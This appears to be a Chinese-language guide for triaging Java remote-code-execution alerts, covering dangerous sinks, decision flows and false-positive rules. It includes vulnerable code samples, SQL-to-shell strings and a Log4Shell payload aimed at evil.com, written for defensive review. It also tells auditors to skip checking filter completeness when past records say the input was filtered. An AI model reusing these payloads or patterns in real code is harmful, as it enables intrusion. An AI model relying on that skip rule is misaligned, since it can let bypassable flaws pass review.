# RCE

## 0. 黄金法则

> **漏洞存在性判断 优先于 防护有效性判断**
>
> 不拼接命令 = 无 RCE（这是漏洞本质判断，不是防护有效判断）
>
> 满足此条件时：立即终止分析，无需检查任何防护措施。

**强制执行顺序**：
1. **首先**：找到 sink 点危险执行代码（如 `Runtime.exec()`, `ProcessBuilder()`, `parseExpression()`）
2. **然后**：分析用户输入是否拼接进命令/表达式
3. **仅当** 命令/表达式拼接时，才继续检查防护措施
4. **禁止**：一上来就检查"有没有沙箱"、"A 有 B 没有"

---

## 1. 结论判断标准

| 结论 | 定义 | 判定条件 |
|------|------|----------|
| **漏洞** | 用户输入可通过 HTTP/gRPC 入口到达危险执行点，无有效防护 | 危险执行函数 + 用户可控数据 + HTTP 入口可达 + 无有效防护 |
| **风险-A** | 存在危险执行函数但无 HTTP/gRPC 入口可达 | 危险执行函数 + 内部调用，无 HTTP/gRPC 入口 |
| **风险-B** | 危险执行函数有 HTTP 入口可达，但防护措施不充分 | 危险执行函数 + 用户输入 + 仅黑名单/部分替换 |
| **安全** | 无危险写法，或有充分的有效防护 | 类型约束/命令固定/参数化/白名单 |

---

## 2. 研判思路

### 2.1 危险执行函数（第一优先级）

| 类型 | 函数 | 危险条件 |
|------|------|----------|
| 命令执行 | `Runtime.exec`, `ProcessBuilder` | 命令/参数用户可控 |
| 表达式注入 | `SpEL.parseExpression`, `GroovyShell.evaluate`, `Ognl.getValue`, `MVEL.eval`, `ScriptEngine.eval` | 表达式内容用户可控 |
| 反序列化 | `ObjectInputStream.readObject`, `Yaml.load`, `Jackson.readValue`, `Fastjson.parseObject` | 反序列化类型/数据可控 |
| JNDI 注入 | `InitialContext.lookup`, `JndiLookup` | JNDI URL 用户可控 |
| 模板引擎 | `Velocity.evaluate`, `FreeMarker.Template`, `Thymeleaf.process`, `PebbleEngine` | 模板内容/表达式可控 |
| 反射调用 | `Method.invoke`, `getMethod`, `Class.forName` | 方法名/参数/类名可控 |

> 以上均为危险执行函数，默认允许执行任意命令/代码。

### 2.2 研判流程

```
Step 1: 输入类型检查
  ├─ int/long/Enum？ → 安全（终止）
  └─ String → 继续

Step 2: 数据源检查
  ├─ DB/缓存/Kconf？ → 风险-A（终止，需确认写入接口权限）
  └─ 用户直接输入 → 继续

Step 3: 命令/表达式拼接检查
  ├─ 命令固定/参数化？ → 安全（终止）
  ├─ 表达式硬编码/沙箱（SimpleEvaluationContext.forReadOnly）？ → 安全（终止）
  ├─ 反序列化类型限制（SafeConstructor/指定类型/autoType关闭）？ → 安全（终止）
  └─ 命令/表达式用户可控 → 继续

Step 3.5: 数组构造方式检查（仅 exec/ProcessBuilder 数组方式适用）
  ├─ 直接构造数组（new String[]{"cmd", "--arg", userArg}）？ → 安全（参数边界固定，终止）
  ├─ ProcessBuilder.command("cmd", "--arg", userArg)？ → 安全（同数组方式，参数边界固定，终止）
  ├─ 字符串拼接 + split 转数组？ → 存在参数注入风险，用户可注入空格拆分出额外参数 → 风险-B
  └─ 字符串拼接 + exec(String)？ → 回到 Step 4 按常规漏洞处理

Step 4: 防护检查
  ├─ 白名单校验？ → 安全（终止）
  ├─ 黑名单/部分替换？ → 风险-B
  └─ 无防护 → 继续

Step 5: HTTP 入口可达性
  ├─ 无 HTTP/gRPC 入口？ → 风险-A
  └─ 有入口 → 漏洞
```

### 2.3 降级条件表

| 条件 | 原结论 | 降级后 |
|------|--------|--------|
| int/long/Enum 类型约束 | 漏洞 | 安全 |
| 三方数据源（DB/缓存/Kconf） | 漏洞 | 风险-A |
| 命令参数化/表达式沙箱/反序列化类型限制 | 漏洞 | 安全 |
| 白名单映射/模板固定 | 漏洞 | 安全 |
| 黑名单/部分替换 | 漏洞 | 风险-B |
| 业务语义约束（历史全 safe + 参数有过滤） | 漏洞 | 安全 |
| 内部服务调用（gRPC 调用方受控） | 漏洞 | 风险-A |

### 2.4 业务约束降级条件

当满足以下条件时，可降级为 safe 或 risk-A：

| 降级条件 | 判定依据 | 降级后 |
|----------|----------|--------|
| 历史全 safe + 备注"参数有进行过滤" + 存在拦截型校验 | 历史已确认安全性，代码存在拦截型校验（return/throw） | safe |
| 命令来源为配置文件（Kconf/配置中心） | 需确认配置写入接口权限控制 | risk-A |
| 命令来源为内部服务调用 | 需确认调用方身份和权限 | risk-A |
| 命令格式有强约束（如必须匹配正则） | 需验证正则是否完整限制 | safe/risk-A |
| 参数业务语义限制（如必须包含特定前缀） | 恶意值不符合业务预期格式 | safe |

**关键区分**："用户直接输入" vs "内部参数传递"

- **用户直接输入**：HTTP Request Param/Body，外部可控 → 需完整防护
- **内部参数传递**：gRPC 内部调用、配置中心、数据库查询结果 → 攻击面受限

**真实误报案例**：

| 项目 | 告警类型 | 误判根因 | 正确判定 |
|------|---------|---------|---------|
| ksfloan-risk-admin | Command_Injection | 未区分用户直接输入 vs 内部参数传递；loginCommand 实际由系统构造，且有拦截型校验 | safe |

### 2.5 总结判定表

| 检查项 | 结论 |
|--------|------|
| 类型约束（int/long/Enum） | 安全 |
| 命令固定/参数化 | 安全 |
| 表达式硬编码/沙箱 | 安全 |
| 反序列化类型限制 | 安全 |
| 白名单映射 | 安全 |
| 默认配置 + 用户输入 + 无防护 + HTTP 入口 | 漏洞 |
| 黑名单/部分替换 + HTTP 入口 | 风险-B |
| 内部方法无 HTTP/gRPC 入口 | 风险-A |

---

## 3. 常见漏洞/风险场景

### 漏洞

```java
// 命令拼接
Runtime.getRuntime().exec("ping " + ip);  // 漏洞
new ProcessBuilder("sh", "-c", cmd + input);  // 漏洞

// 表达式注入
parser.parseExpression(expression).getValue();  // 漏洞（SpEL）
MVEL.eval(userInput, context);  // 漏洞

// 反序列化
new Yaml().load(data);  // 漏洞：无类型限制
JSON.parseObject(json);  // 漏洞：autoType 开启

// JNDI 注入
new InitialContext().lookup(userUrl);  // 漏洞

// 模板/反射注入
templateEngine.process(userTemplate, context);  // 漏洞
obj.getClass().getMethod(methodName).invoke(obj);  // 漏洞：方法名可控

// SQL→RCE 复合链（需 SA/superuser 权限）
"EXEC xp_cmdshell '" + userInput + "'";  // MSSQL
"COPY (SELECT '') TO PROGRAM '" + userCmd + "'";  // PostgreSQL
```

### 风险-A

```java
// DB 来源脚本（需确认写入接口权限）
Script script = scriptMapper.selectById(scriptId);
groovyShell.evaluate(script.getContent());  // 风险-A

// 配置中心命令
@Value("${app.cleanup.command:}") private String cmd;
Runtime.getRuntime().exec(cmd);  // 风险-A
```

### 风险-B

```java
// 黑名单过滤可绕过
String safe = expression.replace("Runtime", "").replace("exec", "");
parser.parseExpression(safe);  // 风险-B

// 宽松包含检查
if (input.contains("{day}")) { input = input.replace("{day}", "86400000"); }
engine.eval(input);  // 风险-B：用户代码仍保留
```

---

## 4. 常见防御模式

### 命令参数化

```java
String[] cmd = {"/bin/ping", "-c", "1", host};  // 安全
new ProcessBuilder(cmd);
```

### 表达式沙箱

```java
SimpleEvaluationContext.forReadOnlyDataBinding().build();  // 安全
```

### 反序列化类型限制

```java
new Yaml(new SafeConstructor());  // 安全
mapper.readValue(json, MyClass.class);  // 指定类型 → 安全
```

### 白名单映射/模板固定

```java
Class<?> handler = HANDLER_MAP.get(userType);  // Map 映射 → 安全
context.setVariable("name", userInput);  // 仅变量值可控 → 安全
templateEngine.process("templates/hello.html", context);  // 路径固定 → 安全
```

---

## 5. 检索技巧

> HTTP 入口可达性检索：详见 [Java 通用检索技巧](java-common-retrieval.md#http-入口可达性检索)

### 搜索关键词

| 类型 | 关键词 |
|------|--------|
| 命令执行 | `Runtime.exec`, `ProcessBuilder`, `getRuntime` |
| 表达式注入 | `parseExpression`, `GroovyShell`, `Ognl.getValue`, `MVEL.eval`, `ScriptEngine` |
| 反序列化 | `readObject`, `Yaml.load`, `enableDefaultTyping`, `SafeConstructor` |
| JNDI 注入 | `InitialContext`, `JndiLookup`, `JdbcRowSetImpl` |
| 模板/反射 | `Velocity.evaluate`, `Template.process`, `FreeMarker`, `getMethod`, `Class.forName` |
| 调度框架 | `XxlJobSpringExecutor`, `IJobHandler`, `ConsulClient`, `YarnClient` |
| Struts2 | `TextParseUtil`, `ActionProxy`, `struts2-core` |

### 检测命令

```bash
# 命令执行
grep -rn "Runtime\.exec\|ProcessBuilder\|\.getRuntime()" --include="*.java"
# 表达式注入
grep -rn "parseExpression\|GroovyShell\|Ognl\.getValue\|MVEL\.eval\|ScriptEngine" --include="*.java"
# 反序列化
grep -rn "readObject\|\.load(\|enableDefaultTyping\|SafeConstructor" --include="*.java"
# JNDI/模板/反射
grep -rn "InitialContext\|JndiLookup\|Velocity\.evaluate\|Template\.process\|FreeMarker\|getMethod\|Class\.forName" --include="*.java"

# 调度框架
grep -rn "XxlJobSpringExecutor\|IJobHandler\|ConsulClient\|YarnClient" --include="*.java"

# Struts2
grep -rn "struts2-core" --include="pom.xml"
```

---

## 6. 常见误判场景

### 陷阱1：ProcessBuilder 参数化误判

**错误**: 看到 `ProcessBuilder` 就认为安全
**正确**: 检查第一个参数——命令固定→安全，命令可控→漏洞

### 陷阱2：exec() 数组方式无 shell 注入

**错误**: `language` 可控 → 命令注入 RCE
**正确**: `exec(new String[]{"tool", "--lang", language})` 数组方式不起 shell，无命令分隔符注入；但 `--file-path` 可控时需评估路径遍历

**前提条件**：数组方式安全的结论仅适用于直接构造数组的场景；若先将用户输入拼接到字符串再 `split(" ")` 转为数组，用户可通过注入空格将参数拆分为多个数组元素，构成参数注入，不能套用此结论

| 构造方式 | 示例 | 风险 |
|---------|------|------|
| 直接构造数组 | `new String[]{"tool", "--arg", userInput}` | 安全（参数边界固定） |
| ProcessBuilder.command | `new ProcessBuilder().command("tool", "--arg", userInput)` | 安全（参数边界固定） |
| 字符串拼接 + split | `("tool --arg " + userInput).split(" ")` | 需分析输入是否可注入空格；若可注入空格则存在参数注入风险 |
| 字符串拼接 + exec(String) | `Runtime.exec("tool --arg " + userInput)` | 漏洞 |

### 陷阱3：黑名单/宽松检查不可靠

**错误**: `replace("Runtime", "")` 是有效防护
**正确**: 编码/绕过技巧可绕过黑名单 → 风险-B

### 陷阱4：先看防护后看漏洞本质

**错误思路**：发现缺少沙箱 → A 有 B 没有 → 判定风险
**正确思路**：先判断漏洞是否存在（命令固定 → 无 RCE）→ 漏洞不存在时防护问题无从谈起

### 陷阱5：被代码对比干扰

**错误判定**：A 有安全配置 B 没有 → B 有风险
**正确判定**：先看 B 漏洞是否存在（数据源是否用户可控），再谈防护

### 陷阱6：忽视历史记录结论

**错误判定**：历史记录 safe 备注"参数有进行过滤"，仍质疑防护完整性（如认为黑名单可绕过）
**正确判定**：历史全 safe + 备注"参数有进行过滤" + 代码存在拦截型校验（return/throw）→ 直接判定 safe，禁止审查防护完整性

**关键规则**：
- 历史备注"参数有进行过滤" = 存在某种校验机制
- 确认校验为拦截型（失败即中断）→ 无需审查完整性
- 仅当历史备注"防护不完整"或"存在绕过案例"时才审查完整性

**真实误报案例**：
ksfloan-risk-admin 项目 Command_Injection 告警，历史 2 条 safe 记录备注"参数有进行过滤"，代码中存在 `if (!loginCmd.contains("login")) return;` 等拦截型校验，但仍被质疑黑名单可绕过，判定为 vulnerability。正确结论应为 safe。

---

## 7. 特殊风险

### Log4Shell (Log4j2 JNDI 注入)

`logger.info("User: {}", message)` — 若 message 含 `${jndi:ldap://evil.com/exp}`，Log4j2 < 2.15 会触发远程类加载。即使无显式 JNDI 调用，日志框架本身即 RCE 入口。

### 调度框架 RCE（xxl-job / Consul / Hadoop YARN）

| 框架 | Sink 点 | 利用条件 |
|------|---------|----------|
| xxl-job | `IJobHandler.execute()` / `XxlJobSpringExecutor` | 任务脚本内容用户可控 |
| Consul | `ConsulClient.agentServiceRegister()` + script_check | 注册时 script_check 内容可控 |
| YARN | `YarnClient.submitApplication()` | 提交的应用命令可控 |

### 文件上传 → RCE 复合链

上传 JSP WebShell 到 Web 根目录后被 Servlet 容器执行；上传恶意 JAR 被 ClassLoader 动态加载。判定要点：上传目录是否在 Web 根目录下 + 后缀白名单是否严格。

### SQL → RCE 复合链

MSSQL `xp_cmdshell` + SA 权限 / PostgreSQL `COPY TO PROGRAM` + superuser 权限。仅当数据库账号为高权限时才升级为 RCE，低权限账号仍为 SQL 注入。

### MVEL 表达式注入

`MVEL.eval(userInput, context)` — MVEL 支持完整 Java 语法，可直接调用 `Runtime.exec()`。与 SpEL 同等危险。

### SimpleEvaluationContext 区分

`SimpleEvaluationContext.forReadOnlyDataBinding()` → 安全（只读沙箱）。`forReadWrite()` → 可能有风险，需检查是否暴露危险方法。

---

## 8. 变更影响分析

| 变更类型 | 变更内容 | 风险 |
|----------|----------|------|
| 新增 | 新增 Runtime.exec/ProcessBuilder 调用 | 确认命令是否固定、是否有 shell 模式 |
| 新增 | 新增表达式注入/反序列化/JNDI 调用 | 确认表达式来源、类型限制 |
| 修改 | 从安全 API 改为危险 API | 引入 RCE 风险 |
| 修改 | 移除白名单/沙箱/类型限制配置 | 移除防护 |
| 修改 | 改用用户输入作为命令/表达式 | 扩大攻击面 |
| 删除 | 删除类型检查/白名单校验 | 移除防护 |

## 9. 质量门禁（强制执行）

在输出审计结论前，按顺序验证：

- [ ] 强制执行顺序已遵守（先检查命令拼接分析）
- [ ] 危险执行函数已正确识别
- [ ] 漏洞本质判断先于防护判断（命令固定直接终止）
- [ ] HTTP 入口可达性已确认，非假设
- [ ] 结论与证据一致，代码行号可追溯
- [ ] 已应用误报排除规则

**上一项未通过，禁止进入下一项。最终检查未通过，禁止宣布审计完成。**
